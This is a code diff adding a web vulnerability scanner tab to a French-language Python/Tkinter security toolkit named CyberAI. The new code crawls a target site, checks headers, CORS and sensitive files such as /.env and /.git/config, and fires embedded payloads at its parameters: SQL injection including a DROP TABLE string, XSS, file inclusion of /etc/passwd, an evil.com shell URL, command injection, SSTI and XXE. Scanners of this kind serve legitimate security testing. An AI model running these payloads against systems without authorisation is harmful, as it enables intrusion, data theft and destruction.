@@ -264,6 +264,7 @@ class CyberAI(tk.Tk):
             " Réseau ":   NetworkTab,
             " Router ":    RouterTab,
             " Web ":       WebTab,
+            " Scan Web ":  WebScannerTab,
             " OSINT ":     OSINTTab,
             " Mots de passe ":  PasswordTab,
             " Crypto ":    CryptoTab,
@@ -4635,6 +4636,600 @@ class VulnDBTab(BaseTab):
                 self.log(self.output, "  Erreur API.", "warning")
         except Exception as e:
             self.log(self.output, f"  Erreur: {e}", "error")
+
+
+# ════════════════════════ 16. WEB SCANNER ════════════════════════
+class WebScannerTab(BaseTab):
+    PAYLOADS = {
+        "sqli_error": ["'", "\"", "1'", "1\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
+                       "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "1' AND 1=1--", "1' AND 1=2--",
+                       "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"],
+        "sqli_blind": ["1' AND '1'='1", "1' AND '1'='2", "1' AND SLEEP(3)--",
+                       "1' AND BENCHMARK(5000000,MD5('x'))--", "1' WAITFOR DELAY '0:0:3'--"],
+        "xss": ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
+                '\"><script>alert(1)</script>', '<svg onload=alert(1)>',
+                '" onmouseover="alert(1)"', 'javascript:alert(1)',
+                '<img src=x onerror=alert(1)>', '<body onload=alert(1)>',
+                '<details open ontoggle=alert(1)>'],
+        "lfi": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+                "../../../etc/passwd%00", "....//....//....//etc/passwd",
+                "../../../../../../../../etc/passwd"],
+        "rfi": ["http://evil.com/shell.txt?", "https://evil.com/shell.txt?"],
+        "cmd": ["; id", "| id", "`id`", "$(id)", "& id", "| echo PWNED",
+                "; ping -c 1 127.0.0.1", "| ping -n 1 127.0.0.1"],
+        "ssti": ["{{7*7}}", "${7*7}", "{{config}}", "${7*'7'}}",
+                 "#{7*7}", "<%= 7*7 %>", "{{''.__class__.__mro__}}"],
+        "open_redirect": ["//evil.com", "https://evil.com", "//evil.com@google.com"],
+        "path_traversal": ["../../../", "..\\..\\..\\", "%2e%2e%2f", "..%252f..%252f"],
+        "xxe": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'],
+        "idor": ["1", "2", "3", "100", "999"],
+    }
+
+    COMMON_FILES = [
+        "/robots.txt", "/sitemap.xml", "/.git/config", "/.env", "/admin",
+        "/backup", "/config.php", "/wp-admin", "/phpinfo.php", "/.htaccess",
+        "/crossdomain.xml", "/clientaccesspolicy.xml", "/WEB-INF/web.xml",
+        "/.DS_Store", "/dump.sql", "/backup.sql", "/db.sql", "/.svn/entries",
+        "/shell.php", "/cmd.php", "/upload.php", "/api", "/graphql",
+    ]
+
+    SECURITY_HEADERS = [
+        "strict-transport-security", "x-frame-options", "x-content-type-options",
+        "content-security-policy", "x-xss-protection", "referrer-policy",
+        "permissions-policy", "cross-origin-opener-policy",
+    ]
+
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.stop_flag = threading.Event()
+        self.vulns = []
+        self.crawled_urls = set()
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        # ── Config ──
+        cfg = ttk.LabelFrame(main, text="Configuration du Scan")
+        cfg.pack(fill=tk.X, pady=(0, 6))
+
+        ttk.Label(cfg, text="URL cible:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.entry_url = ttk.Entry(cfg, width=50, font=("TkDefaultFont", 11))
+        self.entry_url.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
+        cfg.columnconfigure(1, weight=1)
+        self.entry_url.insert(0, "http://example.com")
+
+        ttk.Label(cfg, text="Profondeur:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.spin_depth = ttk.Spinbox(cfg, from_=1, to=5, width=4)
+        self.spin_depth.set(2)
+        self.spin_depth.grid(row=0, column=3, padx=5, pady=4)
+
+        ttk.Label(cfg, text="Threads:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
+        self.spin_threads = ttk.Spinbox(cfg, from_=1, to=20, width=4)
+        self.spin_threads.set(5)
+        self.spin_threads.grid(row=0, column=5, padx=5, pady=4)
+
+        self.var_auth = tk.BooleanVar(value=False)
+        ttk.Checkbutton(cfg, text="Auth (Cookie)", variable=self.var_auth).grid(row=0, column=6, padx=5)
+        self.entry_cookie = ttk.Entry(cfg, width=30, show="*")
+        self.entry_cookie.grid(row=0, column=7, padx=5, pady=4)
+        self.entry_cookie.insert(0, "session=...")
+
+        # ── Checkboxes ──
+        self.checks = {}
+        checks_frame = ttk.LabelFrame(main, text="Tests à effectuer")
+        checks_frame.pack(fill=tk.X, pady=(0, 6))
+        checks = [
+            ("sqli", "SQL Injection"), ("xss", "XSS"), ("lfi", "LFI/RFI"),
+            ("cmd", "Command Injection"), ("ssti", "SSTI"), ("open_redirect", "Open Redirect"),
+            ("path_traversal", "Path Traversal"), ("xxe", "XXE"),
+            ("idor", "IDOR"), ("files", "Fichiers sensibles"), ("headers", "Headers sécurité"),
+            ("methods", "Méthodes HTTP"), ("cors", "CORS"), ("info", "Info Disclosure"),
+        ]
+        for i, (key, label) in enumerate(checks):
+            self.checks[key] = tk.BooleanVar(value=True)
+            ttk.Checkbutton(checks_frame, text=label, variable=self.checks[key]).grid(
+                row=i // 5, column=i % 5, padx=8, pady=2, sticky="w")
+
+        # ── Buttons ──
+        btnf = ttk.Frame(cfg)
+        btnf.grid(row=1, column=0, columnspan=8, pady=6)
+        self.btn_scan = ttk.Button(btnf, text="▶ Scan Complet", command=self.run_scan, width=18)
+        self.btn_scan.pack(side=tk.LEFT, padx=5)
+        self.btn_stop = ttk.Button(btnf, text="⏹ Arrêter", command=self.stop_scan, state=tk.DISABLED, width=12)
+        self.btn_stop.pack(side=tk.LEFT, padx=5)
+        self.btn_crawl = ttk.Button(btnf, text="🕷 Crawler seulement", command=self.run_crawl, width=18)
+        self.btn_crawl.pack(side=tk.LEFT, padx=5)
+        ttk.Button(btnf, text="Export HTML", command=self.run_export, width=14).pack(side=tk.LEFT, padx=5)
+        self.lbl_progress = ttk.Label(btnf, text="Prêt", foreground="gray")
+        self.lbl_progress.pack(side=tk.LEFT, padx=10)
+
+        # ── Results ──
+        res_frame = ttk.LabelFrame(main, text="Résultats du Scan")
+        res_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
+
+        paned = ttk.PanedWindow(res_frame, orient=tk.HORIZONTAL)
+        paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        left_frame = ttk.Frame(paned)
+        paned.add(left_frame, weight=1)
+        ttk.Label(left_frame, text="Vulnérabilités trouvées:", font=("TkDefaultFont", 9, "bold")).pack(anchor="w")
+        self.vuln_list = tk.Listbox(left_frame, height=10, font=("Consolas", 9))
+        self.vuln_list.pack(fill=tk.BOTH, expand=True, pady=2)
+        self.vuln_list.bind("<<ListboxSelect>>", self.on_vuln_select)
+
+        right_frame = ttk.Frame(paned)
+        paned.add(right_frame, weight=2)
+        ttk.Label(right_frame, text="Détails:", font=("TkDefaultFont", 9, "bold")).pack(anchor="w")
+        self.vuln_detail = scrolledtext.ScrolledText(right_frame, height=10, font=("Consolas", 9))
+        self.vuln_detail.pack(fill=tk.BOTH, expand=True, pady=2)
+
+        self.output = self.make_output(main, height=8)
+
+    # ── Running ──
+    def stop_scan(self):
+        self.stop_flag.set()
+        self.btn_scan.config(state=tk.NORMAL)
+        self.btn_stop.config(state=tk.DISABLED)
+        self.lbl_progress.config(text="Arrêté")
+
+    def run_crawl(self):
+        self.clear(self.output)
+        self.vulns = []
+        self.vuln_list.delete(0, tk.END)
+        self.vuln_detail.delete("1.0", tk.END)
+        url = self.entry_url.get().strip()
+        if not url:
+            messagebox.showwarning("Attention", "Entrez une URL.")
+            return
+        if not url.startswith("http"):
+            url = "https://" + url
+        depth = int(self.spin_depth.get())
+        self.stop_flag.clear()
+        self.run_thread(lambda: self.do_crawl(url, depth))
+
+    def do_crawl(self, url, depth):
+        self.crawled_urls = set()
+        self.log(self.output, f"🕷 Crawling: {url} (profondeur: {depth})", "bold")
+        self.lbl_progress.config(text="Crawling...")
+        self._crawl(url, depth, 0)
+        self.log(self.output, f"\n✓ URLs trouvées: {len(self.crawled_urls)}", "success")
+        for u in sorted(self.crawled_urls):
+            self.log(self.output, f"  {u}")
+        self.lbl_progress.config(text=f"{len(self.crawled_urls)} URLs")
+
+    def _crawl(self, url, max_depth, depth):
+        if depth > max_depth or self.stop_flag.is_set():
+            return
+        if url in self.crawled_urls:
+            return
+        self.crawled_urls.add(url)
+        try:
+            r = self.app.session.get(url, timeout=8, verify=False)
+            import re as re_m
+            links = re_m.findall(r'href=[\'"]?([^\'" >]+)', r.text)
+            forms = re_m.findall(r'<form[^>]*action=[\'"]?([^\'"> ]+)', r.text)
+            for link in links + forms:
+                if self.stop_flag.is_set():
+                    break
+                full = link if link.startswith("http") else (
+                    url.rstrip("/") + "/" + link.lstrip("/") if link.startswith("/") else
+                    url.rstrip("/") + "/" + link
+                )
+                if full.startswith("http") and url.split("/")[2] in full:
+                    self._crawl(full, max_depth, depth + 1)
+        except:
+            pass
+
+    def run_scan(self):
+        self.clear(self.output)
+        self.vulns = []
+        self.vuln_list.delete(0, tk.END)
+        self.vuln_detail.delete("1.0", tk.END)
+        url = self.entry_url.get().strip()
+        if not url:
+            messagebox.showwarning("Attention", "Entrez une URL.")
+            return
+        if not url.startswith("http"):
+            url = "https://" + url
+        depth = int(self.spin_depth.get())
+        n_threads = int(self.spin_threads.get())
+        self.stop_flag.clear()
+        self.btn_scan.config(state=tk.DISABLED)
+        self.btn_stop.config(state=tk.NORMAL)
+        self.run_thread(lambda: self.do_scan(url, depth, n_threads))
+
+    def do_scan(self, url, depth, n_threads):
+        self.log(self.output, f"{'═'*60}", "bold")
+        self.log(self.output, f"  CyberAI Web Scanner — Scan Complet", "bold")
+        self.log(self.output, f"  Cible: {url}", "bold")
+        self.log(self.output, f"{'═'*60}\n", "bold")
+
+        # Phase 1: Crawl
+        self.lbl_progress.config(text="Phase 1: Crawling...")
+        self.log(self.output, "[Phase 1] Crawling du site...", "bold")
+        self._crawl(url, depth, 0)
+        self.log(self.output, f"  ✓ {len(self.crawled_urls)} URLs découvertes\n")
+
+        # Phase 2: Passive Scan
+        self.lbl_progress.config(text="Phase 2: Scan passif...")
+        self.log(self.output, "[Phase 2] Analyse passive...", "bold")
+        if self.checks.get("headers", tk.BooleanVar(value=True)).get():
+            self._check_security_headers(url)
+        if self.checks.get("methods", tk.BooleanVar(value=True)).get():
+            self._check_http_methods(url)
+        if self.checks.get("cors", tk.BooleanVar(value=True)).get():
+            self._check_cors(url)
+        if self.checks.get("files", tk.BooleanVar(value=True)).get():
+            self._check_common_files(url)
+        if self.checks.get("info", tk.BooleanVar(value=True)).get():
+            self._check_info_disclosure(url)
+        self.log(self.output, "")
+
+        # Phase 3: Active Scan
+        self.lbl_progress.config(text="Phase 3: Scan actif...")
+        self.log(self.output, "[Phase 3] Tests actifs sur les paramètres...", "bold")
+        test_urls = list(self.crawled_urls)[:50] if self.crawled_urls else [url]
+        params = self._extract_parameters(test_urls)
+
+        if not params:
+            params.append(("GET", url, "q"))
+            params.append(("GET", url, "id"))
+            params.append(("GET", url, "page"))
+            params.append(("GET", url, "file"))
+            params.append(("GET", url, "url"))
+
+        self.log(self.output, f"  {len(params)} paramètres à tester\n")
+
+        active_checks = []
+        if self.checks.get("sqli", tk.BooleanVar(value=True)).get():
+            active_checks.append(("SQLi", self._test_sqli))
+        if self.checks.get("xss", tk.BooleanVar(value=True)).get():
+            active_checks.append(("XSS", self._test_xss))
+        if self.checks.get("lfi", tk.BooleanVar(value=True)).get():
+            active_checks.append(("LFI", self._test_lfi))
+        if self.checks.get("cmd", tk.BooleanVar(value=True)).get():
+            active_checks.append(("CMDi", self._test_cmdi))
+        if self.checks.get("ssti", tk.BooleanVar(value=True)).get():
+            active_checks.append(("SSTI", self._test_ssti))
+        if self.checks.get("open_redirect", tk.BooleanVar(value=True)).get():
+            active_checks.append(("Redirect", self._test_open_redirect))
+        if self.checks.get("path_traversal", tk.BooleanVar(value=True)).get():
+            active_checks.append(("Path Trav.", self._test_path_traversal))
+
+        total_tests = len(active_checks) * len(params)
+        test_count = [0]
+
+        for name, test_func in active_checks:
+            if self.stop_flag.is_set():
+                break
+            self.lbl_progress.config(text=f"Test {name}...")
+            for method, p_url, p_name in params:
+                if self.stop_flag.is_set():
+                    break
+                test_func(method, p_url, p_name)
+                test_count[0] += 1
+                if test_count[0] % 5 == 0:
+                    self.app.after(0, lambda: self.lbl_progress.config(
+                        text=f"Tests: {test_count[0]}/{total_tests} | Vulns: {len(self.vulns)}"))
+
+        # Summary
+        self.log(self.output, f"\n{'═'*60}")
+        self.log(self.output, "  RÉSUMÉ DU SCAN", "bold")
+        self.log(self.output, f"{'═'*60}")
+        risk_counts = {"Critique": 0, "Élevé": 0, "Moyen": 0, "Faible": 0, "Info": 0}
+        for v in self.vulns:
+            risk = v.get("risk", "Info")
+            if risk in risk_counts:
+                risk_counts[risk] += 1
+        for risk, count in risk_counts.items():
+            tag = "error" if risk in ("Critique", "Élevé") else "warning" if risk == "Moyen" else "success"
+            self.log(self.output, f"  {risk}: {count}", tag)
+        self.log(self.output, f"  Total: {len(self.vulns)} vulnérabilités trouvées", "bold")
+        self.log(self.output, f"  URLs crawlées: {len(self.crawled_urls)}")
+        self.log(self.output, f"  Paramètres testés: {len(params)}")
+
+        self.btn_scan.config(state=tk.NORMAL)
+        self.btn_stop.config(state=tk.DISABLED)
+        self.lbl_progress.config(text=f"Terminé - {len(self.vulns)} vulns")
+
+    def _add_vuln(self, name, risk, url, detail, evidence=""):
+        v = {"name": name, "risk": risk, "url": url, "detail": detail, "evidence": evidence}
+        self.vulns.append(v)
+        icon = {"Critique": "🔴", "Élevé": "🟠", "Moyen": "🟡", "Faible": "🔵", "Info": "⚪"}
+        prefix = icon.get(risk, "⚪")
+        self.app.after(0, lambda: self.vuln_list.insert(tk.END, f"{prefix} [{risk}] {name}"))
+        tag = "error" if risk in ("Critique", "Élevé") else "warning" if risk == "Moyen" else "success"
+        self.log(self.output, f"  {prefix} [{risk}] {name} — {url[:80]}", tag)
+
+    def on_vuln_select(self, event):
+        sel = self.vuln_list.curselection()
+        if not sel:
+            return
+        idx = sel[0]
+        if idx < len(self.vulns):
+            v = self.vulns[idx]
+            self.vuln_detail.delete("1.0", tk.END)
+            self.vuln_detail.insert(tk.END, f"Vulnérabilité: {v['name']}\n")
+            self.vuln_detail.insert(tk.END, f"Risque: {v['risk']}\n")
+            self.vuln_detail.insert(tk.END, f"URL: {v['url']}\n\n")
+            self.vuln_detail.insert(tk.END, f"Détail:\n{v['detail']}\n")
+            if v.get("evidence"):
+                self.vuln_detail.insert(tk.END, f"\nPreuve:\n{v['evidence']}\n")
+
+    # ── Passive Checks ──
+    def _check_security_headers(self, url):
+        try:
+            r = self.app.session.get(url, timeout=8, verify=False)
+            missing = []
+            present_headers = {k.lower() for k in r.headers}
+            for h in self.SECURITY_HEADERS:
+                if h not in present_headers:
+                    missing.append(h)
+            if missing:
+                self._add_vuln(f"Headers sécurité manquants ({len(missing)})", "Moyen", url,
+                              f"Headers manquants: {', '.join(missing[:5])}")
+            else:
+                self.log(self.output, "  ✓ Headers sécurité OK", "success")
+        except Exception as e:
+            self.log(self.output, f"  Headers: {e}", "warning")
+
+    def _check_http_methods(self, url):
+        try:
+            for method in ["PUT", "DELETE", "TRACE", "OPTIONS", "PATCH"]:
+                if self.stop_flag.is_set():
+                    break
+                r = self.app.session.request(method, url, timeout=5, verify=False)
+                if r.status_code not in (405, 400, 403, 404):
+                    self._add_vuln(f"Méthode HTTP: {method} activée", "Moyen", url,
+                                  f"La méthode {method} retourne {r.status_code}")
+        except:
+            pass
+
+    def _check_cors(self, url):
+        try:
+            host = url.split("//")[-1].split("/")[0]
+            r = self.app.session.get(url, timeout=5, verify=False)
+            origin = r.headers.get("Access-Control-Allow-Origin", "")
+            if origin == "*":
+                self._add_vuln("CORS permissif (wildcard)", "Moyen", url,
+                              "Access-Control-Allow-Origin: *")
+            elif "credentials" in r.headers.get("Access-Control-Allow-Credentials", "").lower():
+                self._add_vuln("CORS avec credentials", "Faible", url)
+        except:
+            pass
+
+    def _check_common_files(self, url):
+        base = url.rstrip("/")
+        for path in self.COMMON_FILES:
+            if self.stop_flag.is_set():
+                break
+            try:
+                r = self.app.session.get(f"{base}{path}", timeout=5, verify=False, allow_redirects=False)
+                if r.status_code in (200, 301, 302, 401, 403):
+                    risk = "Critique" if any(x in path for x in [".git", ".env", "shell", "dump", "backup"]) else "Moyen"
+                    self._add_vuln(f"Fichier sensible: {path}", risk, f"{base}{path}", f"HTTP {r.status_code}")
+            except:
+                pass
+
+    def _check_info_disclosure(self, url):
+        try:
+            r = self.app.session.get(url, timeout=5, verify=False)
+            text = r.text.lower()
+            patterns = [
+                ("Version PHP", "php version"), ("Version Apache", "apache"),
+                ("Version nginx", "nginx/"), ("Debug", "debug"),
+                ("Stack trace", "stack trace"), ("Error", "warning: "),
+                ("Error", "fatal error"), ("Error", "parse error"),
+                ("Error", "exception"), ("Error", "notice:"),
+                ("phpinfo", "phpinfo"), ("Database error", "mysql_error"),
+                ("Database error", "sql_error"), ("Database error", "db_error"),
+                ("Internal IP", "192.168."), ("Internal IP", "10.0.0."),
+                ("Internal IP", "172.16."),
+            ]
+            for name, pattern in patterns:
+                if pattern in text:
+                    self._add_vuln(f"Information Disclosure: {name}", "Faible", url, f"Pattern: {pattern}")
+        except:
+            pass
+
+    # ── Active Checks ──
+    def _extract_parameters(self, urls):
+        params = []
+        seen = set()
+        import re as re_m
+        for u in urls:
+            if "?" in u:
+                base, qs = u.split("?", 1)
+                for pair in qs.split("&"):
+                    if "=" in pair:
+                        key = pair.split("=", 1)[0]
+                        if key not in seen:
+                            seen.add(key)
+                            params.append(("GET", u, key))
+        return params
+
+    def _test_sqli(self, method, url, param):
+        import re as re_m
+        payloads = self.PAYLOADS["sqli_error"]
+        for p in payloads[:5]:
+            if self.stop_flag.is_set():
+                break
+            test_url = url.replace(f"?{param}=", f"?{param}={p}")
+            if "?" not in url:
+                test_url = url + f"?{param}={p}"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False)
+                text = r.text.lower()
+                errors = ["sql", "mysql", "syntax error", "unclosed", "quotation",
+                         "odbc", "sqlite", "postgresql", "oracle", "driver",
+                         "division by zero", "warning: mysql"]
+                for err in errors:
+                    if err in text:
+                        self._add_vuln("SQL Injection (Error-based)", "Critique", url,
+                                      f"Paramètre: {param}, Payload: {p}", f"Erreur: ...{err}...")
+                        return
+            except:
+                pass
+
+    def _test_xss(self, method, url, param):
+        payloads = self.PAYLOADS["xss"]
+        for p in payloads[:4]:
+            if self.stop_flag.is_set():
+                break
+            import urllib.parse
+            encoded = urllib.parse.quote(p)
+            test_url = url.replace(f"?{param}=", f"?{param}={encoded}")
+            if "?" not in url:
+                test_url = url + f"?{param}={encoded}"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False)
+                if p in r.text or p.replace("'", "\\'") in r.text:
+                    self._add_vuln("XSS Réfléchi", "Critique", url,
+                                  f"Paramètre: {param}, Payload: {p[:50]}", f"Payload reflété dans la réponse")
+                    return
+            except:
+                pass
+
+    def _test_lfi(self, method, url, param):
+        payloads = self.PAYLOADS["lfi"]
+        for p in payloads[:3]:
+            if self.stop_flag.is_set():
+                break
+            test_url = url.replace(f"?{param}=", f"?{param}={p}")
+            if "?" not in url:
+                test_url = url + f"?{param}={p}"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False)
+                if "root:x:" in r.text or "bin/bash" in r.text or "[extensions]" in r.text or "for 16-bit" in r.text:
+                    self._add_vuln("Local File Inclusion (LFI)", "Critique", url,
+                                  f"Paramètre: {param}, Payload: {p}", "Fichier inclus avec succès")
+                    return
+            except:
+                pass
+
+    def _test_cmdi(self, method, url, param):
+        payloads = self.PAYLOADS["cmd"]
+        for p in payloads[:3]:
+            if self.stop_flag.is_set():
+                break
+            test_url = url.replace(f"?{param}=", f"?{param}={p}")
+            if "?" not in url:
+                test_url = url + f"?{param}={p}"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False)
+                if "uid=" in r.text or "PWNED" in r.text or "root:" in r.text:
+                    self._add_vuln("Command Injection", "Critique", url,
+                                  f"Paramètre: {param}, Payload: {p}", "Commande exécutée")
+                    return
+            except:
+                pass
+
+    def _test_ssti(self, method, url, param):
+        payloads = self.PAYLOADS["ssti"]
+        for p in payloads[:4]:
+            if self.stop_flag.is_set():
+                break
+            test_url = url.replace(f"?{param}=", f"?{param}={p}")
+            if "?" not in url:
+                test_url = url + f"?{param}={p}"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False)
+                if "49" in r.text or p in r.text:
+                    self._add_vuln("Server-Side Template Injection (SSTI)", "Critique", url,
+                                  f"Paramètre: {param}, Payload: {p}", "Template injecté")
+                    return
+            except:
+                pass
+
+    def _test_open_redirect(self, method, url, param):
+        payloads = self.PAYLOADS["open_redirect"]
+        for p in payloads:
+            if self.stop_flag.is_set():
+                break
+            test_url = url.replace(f"?{param}=", f"?{param}={p}")
+            if "?" not in url:
+                test_url = url + f"?{param}={p}"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
+                loc = r.headers.get("Location", "")
+                if "evil.com" in loc:
+                    self._add_vuln("Open Redirect", "Moyen", url,
+                                  f"Paramètre: {param}, Redirige vers: {loc}")
+                    return
+            except:
+                pass
+
+    def _test_path_traversal(self, method, url, param):
+        payloads = self.PAYLOADS["path_traversal"]
+        for p in payloads:
+            if self.stop_flag.is_set():
+                break
+            test_url = url.replace(f"?{param}=", f"?{param}={p}etc/passwd")
+            if "?" not in url:
+                test_url = url + f"?{param}={p}etc/passwd"
+            try:
+                r = self.app.session.get(test_url, timeout=5, verify=False)
+                if "root:" in r.text:
+                    self._add_vuln("Path Traversal", "Critique", url,
+                                  f"Paramètre: {param}", "Fichier /etc/passwd accessible")
+                    return
+            except:
+                pass
+
+    # ── Export ──
+    def run_export(self):
+        if not self.vulns:
+            messagebox.showwarning("Attention", "Aucune vulnérabilité à exporter.")
+            return
+        fname = filedialog.asksaveasfilename(defaultextension=".html",
+                                               filetypes=[("HTML", "*.html")])
+        if not fname:
+            return
+        try:
+            risks = {"Critique": 0, "Élevé": 0, "Moyen": 0, "Faible": 0, "Info": 0}
+            rows = ""
+            for v in self.vulns:
+                risks[v.get("risk", "Info")] = risks.get(v.get("risk", "Info"), 0) + 1
+                color = {"Critique": "dc3545", "Élevé": "fd7e14", "Moyen": "ffc107", "Faible": "0d6efd", "Info": "6c757d"}
+                c = color.get(v.get("risk", "Info"), "6c757d")
+                rows += f"""<tr><td><span class="badge" style="background:#{c}">{v.get('risk','?')}</span></td>
+                <td>{v['name']}</td><td style="font-size:12px">{v['url'][:80]}</td></tr>\n"""
+            html = f"""<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
+<title>CyberAI - Rapport Scan Web</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}}
+body{{background:#0d1117;color:#c9d1d9;padding:30px}}
+h1{{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px}}
+.summary{{display:flex;gap:15px;margin:20px 0}}
+.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;flex:1;text-align:center}}
+.card .num{{font-size:32px;font-weight:bold}}
+.card .label{{font-size:12px;color:#8b949e}}
+table{{width:100%;border-collapse:collapse;margin-top:20px}}
+th,td{{padding:10px 12px;text-align:left;border-bottom:1px solid #30363d;font-size:13px}}
+th{{background:#161b22;color:#58a6ff;font-weight:600}}
+tr:hover{{background:#1c2333}}
+.badge{{display:inline-block;padding:2px 8px;border-radius:12px;color:#fff;font-size:11px;font-weight:bold}}
+.footer{{text-align:center;color:#8b949e;padding:30px;font-size:12px}}
+</style></head><body>
+<h1>🛡️ CyberAI — Rapport Scan Web</h1>
+<p style="color:#8b949e;margin:10px 0">Cible: {self.entry_url.get()} | Total: {len(self.vulns)} vulnérabilités</p>
+<div class="summary">
+  <div class="card"><div class="num" style="color:#dc3545">{risks.get("Critique",0)}</div><div class="label">Critique</div></div>
+  <div class="card"><div class="num" style="color:#fd7e14">{risks.get("Élevé",0)}</div><div class="label">Élevé</div></div>
+  <div class="card"><div class="num" style="color:#ffc107">{risks.get("Moyen",0)}</div><div class="label">Moyen</div></div>
+  <div class="card"><div class="num" style="color:#0d6efd">{risks.get("Faible",0)}</div><div class="label">Faible</div></div>
+  <div class="card"><div class="num" style="color:#6c757d">{risks.get("Info",0)}</div><div class="label">Info</div></div>
+</div>
+<table><thead><tr><th>Risque</th><th>Vulnérabilité</th><th>URL</th></tr></thead><tbody>{rows}</tbody></table>
+<div class="footer">Rapport généré par CyberAI v3.0 — {datetime.now().strftime('%Y-%m-%d %H:%M')}</div>
+</body></html>"""
+            with open(fname, "w", encoding="utf-8") as f:
+                f.write(html)
+            messagebox.showinfo("Export", f"Rapport sauvegardé: {fname}")
+        except Exception as e:
+            self.log(self.output, f"Erreur export: {e}", "error")
 
 
 # ════════════════════════ MAIN ════════════════════════
